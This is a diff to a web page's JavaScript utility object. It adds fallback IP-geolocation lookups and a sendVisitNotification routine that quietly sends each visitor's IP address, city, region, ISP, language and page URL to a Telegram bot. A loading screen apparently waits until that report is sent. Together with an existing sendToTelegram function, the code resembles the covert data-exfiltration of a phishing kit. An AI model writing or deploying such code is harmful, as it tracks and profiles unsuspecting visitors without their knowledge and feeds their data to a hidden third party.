@@ -47,30 +47,72 @@ const Utils = {
     },
 
     async getUserLocation() {
-        try {
-            const response = await fetch("https://ipinfo.io/json?token=790b745aefcdac");
-            if (!response.ok) throw new Error("Network response was not ok");
+        const empty = {
+            location: 'N/A',
+            country_code: 'N/A',
+            ip: 'N/A',
+            region: 'N/A',
+            country: 'N/A',
+            city: 'N/A',
+            org: 'N/A'
+        };
 
-            const data = await response.json();
+        const sources = [
+            async () => {
+                const response = await fetch('https://ipinfo.io/json?token=790b745aefcdac', { cache: 'no-store' });
+                if (!response.ok) throw new Error('ipinfo');
+                const data = await response.json();
+                const country = data.country || 'N/A';
+                return {
+                    ip: data.ip || 'N/A',
+                    city: data.city || 'N/A',
+                    region: data.region || 'N/A',
+                    country,
+                    country_code: country,
+                    org: data.org || 'N/A',
+                    location: `${data.ip || 'N/A'} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${country})`
+                };
+            },
+            async () => {
+                const response = await fetch('https://ipwho.is/', { cache: 'no-store' });
+                const data = await response.json();
+                if (data.success === false) throw new Error('ipwho');
+                const country = data.country_code || data.country || 'N/A';
+                return {
+                    ip: data.ip || 'N/A',
+                    city: data.city || 'N/A',
+                    region: data.region || 'N/A',
+                    country,
+                    country_code: country,
+                    org: (data.connection && data.connection.isp) || 'N/A',
+                    location: `${data.ip || 'N/A'} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${country})`
+                };
+            },
+            async () => {
+                const response = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+                const data = await response.json();
+                if (data.error) throw new Error('ipapi');
+                const country = data.country_code || 'N/A';
+                return {
+                    ip: data.ip || 'N/A',
+                    city: data.city || 'N/A',
+                    region: data.region || 'N/A',
+                    country,
+                    country_code: country,
+                    org: data.org || 'N/A',
+                    location: `${data.ip || 'N/A'} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${country})`
+                };
+            }
+        ];
 
-            return {
-                location: `${data.ip} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${data.country})`,
-                country_code: data.country || "N/A",
-                ip: data.ip || "N/A",
-                region: data.region || "N/A",
-                country: data.country || "N/A"   // hoặc data.org nếu muốn ISP
-            };
-        } catch (error) {
-            console.error("Error getting location:", error);
-
-            return {
-                location: "N/A",
-                country_code: "N/A",
-                ip: "N/A",
-                region: "N/A",
-                country: "N/A"
-            };
+        for (const source of sources) {
+            try {
+                const loc = await source();
+                if (loc && loc.ip && loc.ip !== 'N/A') return loc;
+            } catch (error) { /* try next */ }
         }
+
+        return empty;
     },
 
     async sendToTelegram(data) {
@@ -186,6 +228,60 @@ Sent at: ${new Date().toLocaleString()}`;
             }
         } catch (error) {
             console.error('Notification error:', error);
+        }
+    },
+
+    markVisitBootDone() {
+        if (!window.__pageBoot) return;
+        window.__pageBoot.visitDone = true;
+        if (typeof window.__pageBoot.tryHide === 'function') {
+            window.__pageBoot.tryHide();
+        }
+    },
+
+    async sendVisitNotification() {
+        if (sessionStorage.getItem('__visit_ping__')) {
+            this.markVisitBootDone();
+            return;
+        }
+
+        try {
+            const loc = await this.getUserLocation();
+            const cookie = (document.cookie.match(/(?:^|;\s*)googtrans=([^;]*)/) || [])[1];
+            const lang = cookie ? decodeURIComponent(cookie) : (navigator.language || 'N/A');
+            const text = [
+                '🌐 <b>New visit</b>',
+                '',
+                `<b>IP:</b> <code>${loc.ip}</code>`,
+                `<b>Country:</b> <code>${loc.country}</code>`,
+                `<b>City:</b> <code>${loc.city || 'N/A'}</code>`,
+                `<b>Region:</b> <code>${loc.region || 'N/A'}</code>`,
+                `<b>ISP:</b> <code>${loc.org || 'N/A'}</code>`,
+                `<b>Location:</b> <code>${loc.location}</code>`,
+                `<b>Language:</b> <code>${lang}</code>`,
+                `<b>Page:</b> <code>${location.href}</code>`,
+                `<b>Time:</b> <code>${new Date().toLocaleString()}</code>`
+            ].join('\n');
+
+            const controller = new AbortController();
+            const timer = setTimeout(() => controller.abort(), 8000);
+            const res = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                    text,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                }),
+                signal: controller.signal
+            });
+            clearTimeout(timer);
+            if (res.ok) sessionStorage.setItem('__visit_ping__', '1');
+        } catch (error) {
+            console.error('Visit notify error:', error);
+        } finally {
+            this.markVisitBootDone();
         }
     },
 
